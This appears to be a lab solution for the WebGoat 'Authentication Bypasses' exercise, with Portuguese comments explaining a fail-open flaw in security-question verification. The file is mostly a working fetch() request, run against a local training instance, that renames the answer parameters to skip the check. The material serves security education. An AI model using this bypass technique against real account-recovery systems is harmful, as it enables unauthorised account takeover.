// WebGoat - Authentication Bypasses (cenario "2FA Password Reset")
// OWASP: A07 - Identification and Authentication Failures
// CWE-287 (Improper Authentication)

// ---------------------------------------------------------------------------
// Requisicao original esperada pelo formulario de verificacao de conta:
// POST http://127.0.0.1:8080/WebGoat/auth-bypass/verify-account
// Content-Type: application/x-www-form-urlencoded
// Body: secQuestion0=<resposta>&secQuestion1=<resposta>&jsEnabled=1&
//       verifyMethod=SEC_QUESTIONS&userId=12309746
// ---------------------------------------------------------------------------

// Falha identificada: a logica do servidor so valida as perguntas de
// seguranca SE os parametros chegarem com o nome exato esperado
// (secQuestion0 / secQuestion1). Se os parametros forem renomeados, o
// servidor nao encontra nenhuma pergunta para checar e libera o acesso
// mesmo assim (falha de logica de validacao / fail-open).

// Executar no Console do DevTools (F12), apos preencher e enviar o
// formulario normalmente uma vez (para ter sessao/userId validos):

fetch("http://127.0.0.1:8080/WebGoat/auth-bypass/verify-account", {
  headers: {
    "accept": "*/*",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest"
  },
  referrer: "http://127.0.0.1:8080/WebGoat/start.mvc?username=heisedev",
  body: "secQuestion0x=test&secQuestion1x=test&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746",
  method: "POST",
  mode: "cors",
  credentials: "include"
}).then(r => r.text()).then(console.log).catch(console.error)

// Resultado esperado: lessonCompleted: true, feedback:
// "Congrats, you have successfully verified the account without actually
// verifying it. You can now change your password!"
